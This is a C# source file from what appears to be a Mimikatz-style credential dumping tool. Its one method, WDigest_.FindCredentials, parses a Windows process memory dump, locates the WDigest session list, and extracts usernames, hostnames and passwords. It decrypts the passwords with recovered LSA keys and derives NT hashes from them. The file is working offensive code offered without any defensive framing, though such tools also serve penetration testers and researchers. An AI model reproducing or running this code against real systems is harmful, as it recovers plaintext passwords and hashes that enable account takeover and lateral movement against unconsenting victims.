using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    internal class WDigest_
    {
        public static int FindCredentials(Program.MiniDump minidump, wdigest.WdigestTemplate template)
        {
            wdigest.KIWI_WDIGEST_LIST_ENTRY entry;
            long logSessListAddr;
            long llCurrent;
            var passDecrypted = "";

            long position = find_signature(minidump, "wdigest.dll", template.signature);
            if (position == 0)
                return 0;

            var ptr_entry_loc = get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            var ptr_entry = ReadUInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);
            logSessListAddr = Rva2offset(minidump, (long)ptr_entry);

            minidump.fileBinaryReader.BaseStream.Seek(logSessListAddr, 0);
            byte[] entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(wdigest.KIWI_WDIGEST_LIST_ENTRY)));

            var pThis = BitConverter.ToInt64(entryBytes, FieldOffset<wdigest.KIWI_WDIGEST_LIST_ENTRY>("This"));
            llCurrent = pThis;

            do
            {
                llCurrent = Rva2offset(minidump, llCurrent);
                minidump.fileBinaryReader.BaseStream.Seek(llCurrent, 0);
                entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(wdigest.KIWI_WDIGEST_LIST_ENTRY)));
                entry = ReadStruct<wdigest.KIWI_WDIGEST_LIST_ENTRY>(entryBytes);

                if (entry.UsageCount == 1)
                {
                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent + template.USERNAME_OFFSET, 0);
                    var username = ExtractUnicodeStringString(minidump, ExtractUnicodeString(minidump.fileBinaryReader));
                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent + template.HOSTNAME_OFFSET, 0);
                    var hostname = ExtractUnicodeStringString(minidump, ExtractUnicodeString(minidump.fileBinaryReader));
                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent + template.PASSWORD_OFFSET, 0);
                    var password = ExtractUnicodeStringString(minidump, ExtractUnicodeString(minidump.fileBinaryReader));

                    if (!string.IsNullOrEmpty(username) && username.Length > 1)
                    {
                        var luid = entry.LocallyUniqueIdentifier;

                        var wdigestentry = new WDigest();
                        wdigestentry.UserName = username;

                        if (!string.IsNullOrEmpty(hostname))
                            wdigestentry.HostName = hostname;
                        else
                            wdigestentry.HostName = "NULL";

                        byte[] passDecryptedBytes = new byte[] { };
                        if (!string.IsNullOrEmpty(password) && password.Length % 2 == 0)
                        {
                            passDecryptedBytes = BCrypt.DecryptCredentials(Encoding.Unicode.GetBytes(password), minidump.lsakeys);
                            passDecrypted = Encoding.Unicode.GetString(passDecryptedBytes);
                            if (passDecrypted.Length > 0)
                                wdigestentry.Password = passDecrypted;
                        }
                        else
                        {
                            wdigestentry.Password = "NULL";
                        }

                        if (passDecryptedBytes.Length > 0)
                        {
                            try
                            {
                                wdigestentry.NT = passDecryptedBytes.MD4().AsHexString();
                            }
                            catch
                            {
                                wdigestentry.NT = "NULL";
                            }
                        }

                        if (wdigestentry.Password != "NULL")
                        {
                            var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                            if (currentlogon == null)
                            {
                                currentlogon = new Logon(luid)
                                {
                                    UserName = username,
                                    Wdigest = new List<WDigest>()
                                };
                                currentlogon.Wdigest.Add(wdigestentry);
                                minidump.logonlist.Add(currentlogon);
                            }
                            else
                            {
                                currentlogon.Wdigest = new List<WDigest>();
                                currentlogon.Wdigest.Add(wdigestentry);
                            }
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != (long)ptr_entry);

            return 0;
        }
    }
}